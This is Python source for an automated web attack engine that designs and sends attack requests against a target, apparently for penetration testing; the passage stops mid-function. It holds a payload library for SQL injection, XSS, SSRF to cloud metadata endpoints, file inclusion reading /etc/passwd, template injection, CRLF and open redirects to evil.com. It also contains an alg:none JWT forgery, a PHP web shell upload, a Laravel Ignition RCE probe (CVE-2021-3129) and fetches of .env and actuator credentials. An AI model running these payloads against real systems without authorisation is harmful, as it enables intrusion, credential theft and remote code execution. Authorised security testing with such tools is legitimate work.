"""
Custom Test Designer & Executor
=================================
Automatically designs and executes attack tests based on vulnerability theories.
Integrates with ToolRegistry (dalfox, sqlmap, ffuf, httpx) and a built-in
HTTP request engine for custom payload delivery.
"""

from __future__ import annotations

import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

from oneinfinity.path_manager import resolve_output_dir
from typing import Any, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed


# ── Data models ───────────────────────────────────────────────────────────────

@dataclass
class AttackTest:
    """A single designed attack test."""
    test_id: str
    theory_id: str
    vuln_type: str
    endpoint: str
    method: str = "GET"
    params: dict[str, str] = field(default_factory=dict)    # modified parameters
    headers: dict[str, str] = field(default_factory=dict)
    body: dict | str | None = None
    tool: str = "http"          # http | dalfox | sqlmap | ffuf | nuclei
    tool_args: dict = field(default_factory=dict)
    description: str = ""
    expected_indicator: str = ""  # what to look for in response
    severity: str = "medium"
    passive: bool = True          # True = non-destructive test
    payload_used: str = ""        # the payload injected (for response analysis)


@dataclass
class TestResult:
    """Result of executing one AttackTest."""
    test_id: str
    theory_id: str
    vuln_type: str
    endpoint: str
    success: bool
    status_code: int = 0
    response_size: int = 0
    response_time_ms: float = 0.0
    response_snippet: str = ""
    anomaly_score: float = 0.0       # 0.0–1.0
    confirmed: bool = False
    evidence: str = ""
    error: str = ""
    raw_output: str = ""
    payload_used: str = ""

    def to_dict(self) -> dict:
        return {
            "test_id": self.test_id,
            "theory_id": self.theory_id,
            "vuln_type": self.vuln_type,
            "endpoint": self.endpoint,
            "success": self.success,
            "status_code": self.status_code,
            "response_size": self.response_size,
            "response_time_ms": round(self.response_time_ms, 1),
            "confirmed": self.confirmed,
            "evidence": self.evidence,
            "anomaly_score": round(self.anomaly_score, 2),
            "payload_used": self.payload_used,
            "error": self.error,
        }


# ── Payload library ───────────────────────────────────────────────────────────

_PAYLOADS: dict[str, list[str]] = {
    "sqli_error": [
        "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "' AND 1=CONVERT(int,@@version)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    ],
    "sqli_time": [
        "' AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--",
        "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--",
    ],
    "xss_basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
    ],
    "xss_polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
    ],
    "ssrf_cloud": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "http://169.254.169.254/metadata/v1/",        # DigitalOcean
    ],
    "ssrf_internal": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:6379/",   # Redis
        "http://127.0.0.1:27017/",  # MongoDB
        "http://0.0.0.0/",
        "http://2130706433/",        # Decimal 127.0.0.1
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "../../../../windows/system32/drivers/etc/hosts",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{''.class.mro[1].subclasses()}}",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "\\evil.com",
        "https://evil.com%2F@target.com",
        "%2F%2Fevil.com",
    ],
    "crlf": [
        "%0d%0aSet-Cookie:%20injected=1",
        "%0aSet-Cookie:%20injected=1",
        "%0d%0aLocation:%20https://evil.com",
        "\r\nSet-Cookie: injected=1",
    ],
    "path_traversal": [
        "../",
        "../../",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "..%252f",
    ],
    "debug_paths": [
        "/.env", "/.env.backup", "/.env.local", "/.env.production",
        "/.git/config", "/.git/HEAD",
        "/debug", "/console", "/phpinfo.php",
        "/actuator", "/actuator/env", "/actuator/heapdump",
        "/telescope", "/horizon",
        "/.DS_Store", "/web.config", "/WEB-INF/web.xml",
    ],
    "jwt_none": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",  # {"alg":"none","typ":"JWT"}
    ],
    "graphql_introspect": [
        '{"query":"{__schema{types{name fields{name type{name}}}}}"}',
        '{"query":"{__type(name:\\"Query\\"){fields{name}}}"}',
    ],
    "mass_assign": [
        '{"is_admin":true}',
        '{"role":"admin"}',
        '{"verified":true}',
        '{"balance":99999}',
        '{"user_type":"superuser"}',
    ],
}


# ── Test designer ─────────────────────────────────────────────────────────────

class CustomTestEngine:
    """
    Designs and executes attack tests from vulnerability theories.
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "",
        base_url: str = "",
        tool_registry=None,
        rate_limit: float = 1.0,      # min seconds between requests
        timeout: int = 15,
        oob_url: str = "",
    ):
        self.target = target
        self.output_dir = resolve_output_dir(output_dir, target)
        self.base_url = base_url or f"http://{target}"
        self.tool_registry = tool_registry
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.oob_url = oob_url
        self._last_request_time: float = 0.0

    # ── Public API ────────────────────────────────────────────────────────────

    def generate_attack_tests(self, theory) -> list[AttackTest]:
        """
        Design a list of AttackTests from a single VulnTheory.
        """
        gen_map = {
            "IDOR":                          self._gen_idor_tests,
            "Privilege Escalation":          self._gen_privesc_tests,
            "Mass Assignment / Role Escalation": self._gen_mass_assign_tests,
            "Mass Assignment":               self._gen_mass_assign_tests,
            "Authentication Bypass":         self._gen_auth_bypass_tests,
            "JWT Algorithm Confusion":       self._gen_jwt_tests,
            "JWT 'kid' Header Injection":    self._gen_jwt_kid_tests,
            "SQL Injection":                 self._gen_sqli_tests,
            "Cross-Site Scripting (XSS)":    self._gen_xss_tests,
            "Server-Side Request Forgery (SSRF)": self._gen_ssrf_tests,
            "Local File Inclusion (LFI)":    self._gen_lfi_tests,
            "Server-Side Template Injection (SSTI)": self._gen_ssti_tests,
            "Open Redirect":                 self._gen_redirect_tests,
            "Business Logic Flaw":           self._gen_logic_tests,
            "Unrestricted File Upload":      self._gen_upload_tests,
            "Excessive Data Exposure":       self._gen_data_exposure_tests,
            "CORS Misconfiguration":         self._gen_cors_tests,
            "CRLF Injection":                self._gen_crlf_tests,
            "GraphQL Introspection / Injection": self._gen_graphql_tests,
            "Missing Rate Limiting":         self._gen_rate_limit_tests,
            "Debug Information Disclosure":  self._gen_debug_tests,
            "Unauthorized Data Export":      self._gen_export_tests,
            "Laravel Debug Mode Disclosure": self._gen_laravel_tests,
            "Laravel .env File Exposure":    self._gen_laravel_env_tests,
            "Spring Boot Actuator Exposure": self._gen_spring_tests,
            "PHP Object Injection":          self._gen_php_obj_tests,
            # New OWASP coverage
            "Insecure Deserialization":      self._gen_deserialization_tests,
            "Race Condition":                self._gen_race_condition_tests,
            "Insecure File Upload":          self._gen_file_upload_tests,
            "OAuth/OIDC Vulnerability":      self._gen_oauth_vuln_tests,
            "Prototype Pollution":           self._gen_prototype_pollution_tests,
            "Clickjacking":                  self._gen_clickjacking_tests,
            "PII Exposure in API Response":  self._gen_pii_exposure_tests,
            "MFA/2FA Bypass":                self._gen_mfa_bypass_tests,
            "WebSocket Security Issue":      self._gen_websocket_tests,
            "Exposed JavaScript Source Map": self._gen_source_map_tests,
            "Payment/Price Tampering":       self._gen_payment_tampering_tests,
        }

        gen_fn = gen_map.get(theory.vuln_type)
        if gen_fn:
            return gen_fn(theory)
        return self._gen_generic_tests(theory)

    def execute_attack_tests(
        self,
        tests: list[AttackTest],
        max_workers: int = 1,
    ) -> list[TestResult]:
        """
        Execute a list of AttackTests and return results.
        Sequential by default (max_workers=1) to respect rate limits.
        """
        results: list[TestResult] = []
        for test in tests:
            try:
                result = self._execute_single(test)
                results.append(result)
                self._sleep_rate()
            except Exception as exc:
                results.append(TestResult(
                    test_id=test.test_id,
                    theory_id=test.theory_id,
                    vuln_type=test.vuln_type,
                    endpoint=test.endpoint,
                    success=False,
                    error=str(exc),
                ))

        # Save results
        out_path = self.output_dir / "test_results.json"
        out_path.parent.mkdir(parents=True, exist_ok=True)
        existing: list[dict] = []
        if out_path.exists():
            try:
                existing = json.loads(out_path.read_text())
            except Exception:
                pass
        existing.extend(r.to_dict() for r in results)
        out_path.write_text(json.dumps(existing, indent=2))

        return results

    # ── Test generators ───────────────────────────────────────────────────────

    def _gen_idor_tests(self, theory) -> list[AttackTest]:
        tests = []
        url = self._build_url(theory.endpoint)
        for i, param in enumerate(theory.parameters[:3]):
            # Sequential ID change
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_idor_seq_{i}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={param: "2"},   # Try ID=2 (assumes current user is ID=1)
                description=f"IDOR: change {param} from 1 to 2",
                expected_indicator="200 with different user data",
                severity=theory.severity,
            ))
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_idor_zero_{i}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={param: "0"},
                description=f"IDOR: change {param} to 0 (often admin/system user)",
                expected_indicator="Response with elevated data",
                severity=theory.severity,
            ))
        return tests

    def _gen_privesc_tests(self, theory) -> list[AttackTest]:
        url = self._build_url(theory.endpoint)
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_nauth",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={},   # No auth header
                description="Access admin endpoint without authentication",
                expected_indicator="Non-401/403 response",
                severity=theory.severity,
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_role_param",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={"role": "admin", "is_admin": "true"},
                description="Access admin endpoint with role=admin param",
                expected_indicator="200 OK or admin content",
                severity=theory.severity,
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_xff",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"X-Original-URL": "/admin", "X-Rewrite-URL": "/admin",
                         "X-Forwarded-For": "127.0.0.1"},
                description="Admin bypass via X-Original-URL header",
                expected_indicator="200 OK",
                severity=theory.severity,
            ),
        ]

    def _gen_mass_assign_tests(self, theory) -> list[AttackTest]:
        tests = []
        for i, payload_str in enumerate(_PAYLOADS["mass_assign"][:3]):
            try:
                payload = json.loads(payload_str)
            except Exception:
                payload = payload_str
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_massassign_{i}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body=payload,
                headers={"Content-Type": "application/json"},
                description=f"Mass assignment: inject {payload_str}",
                expected_indicator="200/201 with elevated role",
                severity=theory.severity,
            ))
        return tests

    def _gen_auth_bypass_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_noauth",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                description="Access sensitive endpoint with no Authorization header",
                expected_indicator="Non-401/403 response indicates bypass",
                severity=theory.severity,
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_expired_jwt",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"Authorization": "Bearer " + "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
                         + "." + "eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ" + "."},
                description="Access with alg:none JWT token",
                expected_indicator="200 response indicates JWT not verified",
                severity=theory.severity,
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_http_method",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="HEAD",
                description="Try HEAD method to bypass auth check on GET",
                expected_indicator="200 HEAD response when GET returns 403",
                severity=theory.severity,
            ),
        ]

    def _gen_jwt_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_none_alg",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={
                    "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
                                     ".eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.",
                },
                description="JWT none algorithm bypass",
                expected_indicator="200 OK (alg:none accepted)",
                severity="critical",
                tool="http",
            ),
        ]

    def _gen_jwt_kid_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_kid_traversal",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                description="JWT kid path traversal — use /dev/null as key file",
                expected_indicator="200 OK",
                severity="critical",
                tool="http",
                # Note: actual JWT crafting requires jwt_tool; we log the test design
                tool_args={"note": "Use jwt_tool -X k -pk /dev/null to craft the token"},
            ),
        ]

    def _gen_sqli_tests(self, theory) -> list[AttackTest]:
        tests = []
        url = self._build_url(theory.endpoint)

        # Use sqlmap if available
        tests.append(AttackTest(
            test_id=f"{theory.theory_id}_sqlmap",
            theory_id=theory.theory_id,
            vuln_type=theory.vuln_type,
            endpoint=theory.endpoint,
            method="GET",
            params={p: "1" for p in theory.parameters[:2]},
            tool="sqlmap",
            tool_args={"level": 1, "risk": 1, "timeout": 300},
            description=f"sqlmap scan on {theory.parameters[:2]}",
            expected_indicator="Parameter is vulnerable",
            severity=theory.severity,
        ))

        # Quick error-based probes
        for i, payload in enumerate(_PAYLOADS["sqli_error"][:3]):
            for param in theory.parameters[:2]:
                tests.append(AttackTest(
                    test_id=f"{theory.theory_id}_sqli_err_{i}_{param}",
                    theory_id=theory.theory_id,
                    vuln_type=theory.vuln_type,
                    endpoint=theory.endpoint,
                    method="GET",
                    params={param: payload},
                    tool="http",
                    description=f"SQLi error probe: {payload[:30]}",
                    expected_indicator="SQL error message in response",
                    severity=theory.severity,
                    payload_used=payload,
                ))

        # Time-based probe
        for param in theory.parameters[:1]:
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_sqli_time_{param}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={param: "' AND SLEEP(5)--"},
                tool="http",
                description=f"SQLi time-based blind probe on {param}",
                expected_indicator="Response delayed >5 seconds",
                severity=theory.severity,
                payload_used="' AND SLEEP(5)--",
            ))
        return tests

    def _gen_xss_tests(self, theory) -> list[AttackTest]:
        tests = []
        # Prefer dalfox
        for param in theory.parameters[:3]:
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_dalfox_{param}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={param: "<script>alert(1)</script>"},
                tool="dalfox",
                tool_args={"param": param, "timeout": 60},
                description=f"dalfox XSS scan on parameter '{param}'",
                expected_indicator="XSS confirmed by dalfox",
                severity=theory.severity,
            ))

        # Manual reflection probes
        probe = f"XSSTEST{int(time.time()) % 10000}"
        for param in theory.parameters[:2]:
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_reflect_{param}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={param: probe},
                tool="http",
                description=f"XSS reflection probe: inject unique string into {param}",
                expected_indicator=f"{probe} reflected in response body",
                severity=theory.severity,
                payload_used=probe,
            ))
        return tests

    def _gen_ssrf_tests(self, theory) -> list[AttackTest]:
        tests = []
        oob = self.oob_url or "http://169.254.169.254/latest/meta-data/"
        for i, param in enumerate(theory.parameters[:3]):
            for j, payload in enumerate(_PAYLOADS["ssrf_cloud"][:2]):
                tests.append(AttackTest(
                    test_id=f"{theory.theory_id}_ssrf_{i}_{j}",
                    theory_id=theory.theory_id,
                    vuln_type=theory.vuln_type,
                    endpoint=theory.endpoint,
                    method="GET",
                    params={param: payload},
                    tool="http",
                    description=f"SSRF: inject cloud metadata URL into {param}",
                    expected_indicator="Cloud metadata in response",
                    severity=theory.severity,
                    payload_used=payload,
                ))
            # Internal service probe
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_ssrf_internal_{i}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={param: "http://127.0.0.1/"},
                tool="http",
                description=f"SSRF: probe internal localhost via {param}",
                expected_indicator="200 with internal content",
                severity=theory.severity,
                payload_used="http://127.0.0.1/",
            ))
        return tests

    def _gen_lfi_tests(self, theory) -> list[AttackTest]:
        tests = []
        for param in theory.parameters[:2]:
            for i, payload in enumerate(_PAYLOADS["lfi"][:4]):
                tests.append(AttackTest(
                    test_id=f"{theory.theory_id}_lfi_{param}_{i}",
                    theory_id=theory.theory_id,
                    vuln_type=theory.vuln_type,
                    endpoint=theory.endpoint,
                    method="GET",
                    params={param: payload},
                    tool="http",
                    description=f"LFI probe: {payload[:40]}",
                    expected_indicator="root: in response (passwd file)",
                    severity=theory.severity,
                    payload_used=payload,
                ))
        return tests

    def _gen_ssti_tests(self, theory) -> list[AttackTest]:
        tests = []
        for param in theory.parameters[:3]:
            for i, payload in enumerate(_PAYLOADS["ssti"]):
                tests.append(AttackTest(
                    test_id=f"{theory.theory_id}_ssti_{param}_{i}",
                    theory_id=theory.theory_id,
                    vuln_type=theory.vuln_type,
                    endpoint=theory.endpoint,
                    method="GET",
                    params={param: payload},
                    tool="http",
                    description=f"SSTI probe: {payload}",
                    expected_indicator="49 in response (7*7=49 confirms SSTI)",
                    severity="critical",
                    payload_used=payload,
                ))
        return tests

    def _gen_redirect_tests(self, theory) -> list[AttackTest]:
        tests = []
        for param in theory.parameters[:2]:
            for i, payload in enumerate(_PAYLOADS["open_redirect"][:3]):
                tests.append(AttackTest(
                    test_id=f"{theory.theory_id}_redir_{param}_{i}",
                    theory_id=theory.theory_id,
                    vuln_type=theory.vuln_type,
                    endpoint=theory.endpoint,
                    method="GET",
                    params={param: payload},
                    tool="http",
                    description=f"Open redirect: {param}={payload}",
                    expected_indicator="Location: evil.com in response headers",
                    severity=theory.severity,
                    payload_used=payload,
                ))
        return tests

    def _gen_logic_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_neg_price",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body={"price": -1, "amount": -1, "quantity": -1},
                headers={"Content-Type": "application/json"},
                description="Business logic: negative price/quantity",
                expected_indicator="200 OK with negative total",
                severity="critical",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_zero_price",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body={"price": 0, "amount": 0.00},
                headers={"Content-Type": "application/json"},
                description="Business logic: zero price",
                expected_indicator="200 OK order placed at $0",
                severity="critical",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_race",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="Race condition: double-submit order simultaneously",
                expected_indicator="Two successful responses for one payment",
                severity="critical",
                tool_args={"race_count": 10, "note": "Use Turbo Intruder for race condition"},
            ),
        ]

    def _gen_upload_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_svg_xss",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="Upload SVG file with embedded XSS",
                expected_indicator="SVG rendered and script executes",
                severity="high",
                tool_args={"filename": "test.svg",
                           "content": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
                           "content_type": "image/svg+xml"},
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_php_shell",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="Upload PHP shell disguised as image",
                expected_indicator="PHP executed (RCE confirmed)",
                severity="critical",
                passive=False,  # Destructive test — requires explicit confirmation
                tool_args={"filename": "test.php.jpg",
                           "content": "<?php system($_GET['cmd']); ?>",
                           "content_type": "image/jpeg"},
            ),
        ]

    def _gen_data_exposure_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_raw_fields",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"Accept": "application/json"},
                description="Fetch raw API response and inspect all JSON fields",
                expected_indicator="Sensitive fields: password_hash, ssn, dob not visible in UI",
                severity=theory.severity,
            ),
        ]

    def _gen_cors_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_cors_evil",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"Origin": "https://evil.com"},
                description="CORS: send Origin: evil.com, check ACAO response",
                expected_indicator="Access-Control-Allow-Origin: https://evil.com + ACAC: true",
                severity=theory.severity,
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_cors_null",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"Origin": "null"},
                description="CORS: send Origin: null",
                expected_indicator="Access-Control-Allow-Origin: null + ACAC: true",
                severity=theory.severity,
            ),
        ]

    def _gen_crlf_tests(self, theory) -> list[AttackTest]:
        tests = []
        for param in theory.parameters[:2]:
            for i, payload in enumerate(_PAYLOADS["crlf"][:2]):
                tests.append(AttackTest(
                    test_id=f"{theory.theory_id}_crlf_{param}_{i}",
                    theory_id=theory.theory_id,
                    vuln_type=theory.vuln_type,
                    endpoint=theory.endpoint,
                    method="GET",
                    params={param: payload},
                    tool="http",
                    description=f"CRLF injection in {param}",
                    expected_indicator="Set-Cookie: injected=1 in response headers",
                    severity=theory.severity,
                    payload_used=payload,
                ))
        return tests

    def _gen_graphql_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_gql_introspect",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body='{"query":"{__schema{types{name fields{name}}}}"}',
                headers={"Content-Type": "application/json"},
                tool="http",
                description="GraphQL introspection query",
                expected_indicator="Schema types returned in response",
                severity=theory.severity,
            ),
        ]

    def _gen_rate_limit_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_ratelimit",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="Rate limit: send 20 rapid auth requests",
                expected_indicator="No 429 response after 20 attempts",
                severity=theory.severity,
                tool_args={"repeat": 20, "interval_ms": 100},
            ),
        ]

    def _gen_debug_tests(self, theory) -> list[AttackTest]:
        tests = []
        for i, path in enumerate(_PAYLOADS["debug_paths"][:8]):
            tests.append(AttackTest(
                test_id=f"{theory.theory_id}_debug_{i}",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=path,
                method="GET",
                tool="http",
                description=f"Probe debug path: {path}",
                expected_indicator="200 OK with sensitive content",
                severity=theory.severity,
            ))
        return tests

    def _gen_export_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_export_noauth",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={"format": "csv"},
                description="Download export without authentication",
                expected_indicator="200 with data",
                severity=theory.severity,
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_export_idor",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={"user_id": "2", "format": "json"},
                description="IDOR in export: download another user's data",
                expected_indicator="Different user's data returned",
                severity=theory.severity,
            ),
        ]

    def _gen_laravel_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_ignition",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint="/_ignition/execute-solution",
                method="POST",
                body={
                    "solution_class": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                    "bindings": {"variableName": "cve", "viewFile": "php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php"},
                },
                headers={"Content-Type": "application/json"},
                description="Laravel Ignition RCE probe (CVE-2021-3129)",
                expected_indicator="200 OK",
                severity="critical",
                passive=False,
            ),
        ]

    def _gen_laravel_env_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_env",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint="/.env",
                method="GET",
                tool="http",
                description="Fetch /.env file",
                expected_indicator="APP_KEY= or DB_PASSWORD= in response",
                severity="critical",
            ),
        ]

    def _gen_spring_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_actuator_env",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint="/actuator/env",
                method="GET",
                tool="http",
                description="Fetch Spring Boot actuator env",
                expected_indicator="DB passwords or API keys in response",
                severity="critical",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_actuator_heapdump",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint="/actuator/heapdump",
                method="GET",
                tool="http",
                description="Download heap dump (may contain credentials)",
                expected_indicator="Binary heap dump download",
                severity="high",
            ),
        ]

    def _gen_php_obj_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_php_unserialize",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                description="PHP object injection via cookie — look for base64 O: prefix",
                expected_indicator="500 error or changed behavior after malformed object",
                severity="critical",
                tool_args={"note": "Use phpggc to generate gadget chain for detected framework"},
            ),
        ]

    def _gen_deserialization_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_deser_java",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                headers={"Content-Type": "application/x-java-serialized-object"},
                description="Java deserialization: send magic bytes rO0AB probe; watch for timing/error change",
                expected_indicator=">3s response time or 500 error with stack trace",
                severity="critical",
                tool_args={"note": "Use ysoserial to generate gadget chains for detected framework"},
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_deser_php",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={"data": "O:8:\"stdClass\":0:{}"},
                description="PHP unserialize: inject serialized stdClass in query param",
                expected_indicator="500 error or changed response behavior",
                severity="critical",
            ),
        ]

    def _gen_race_condition_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_race_concurrent",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="Race condition: send 25 concurrent identical requests to state-changing endpoint",
                expected_indicator="Multiple success responses (200/201) — indicates no mutex/atomic check",
                severity="high",
                tool_args={"repeat": 25, "concurrent": True},
            ),
        ]

    def _gen_file_upload_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_upload_php_jpeg",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                headers={"Content-Type": "multipart/form-data"},
                description="File upload bypass: PHP payload with JPEG magic bytes (FFD8FF)",
                expected_indicator="200 OK with file URL in response — confirms server-side exec risk",
                severity="critical",
                tool_args={"note": "Use GIF89a; <?php system($_GET['cmd']); ?> as polyglot payload"},
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_upload_double_ext",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="File upload bypass: double extension shell.php.jpg",
                expected_indicator="File accessible via URL with .php.jpg extension",
                severity="critical",
            ),
        ]

    def _gen_oauth_vuln_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_oauth_state",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={"state": ""},
                description="OAuth CSRF: initiate flow without state parameter",
                expected_indicator="Authorization proceeds without state validation (CSRF risk)",
                severity="high",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_oauth_redirect",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                params={"redirect_uri": "https://evil.com/callback"},
                description="OAuth open redirect: inject external redirect_uri",
                expected_indicator="Redirect to evil.com — confirms redirect_uri not validated",
                severity="critical",
            ),
        ]

    def _gen_prototype_pollution_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_proto_get",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
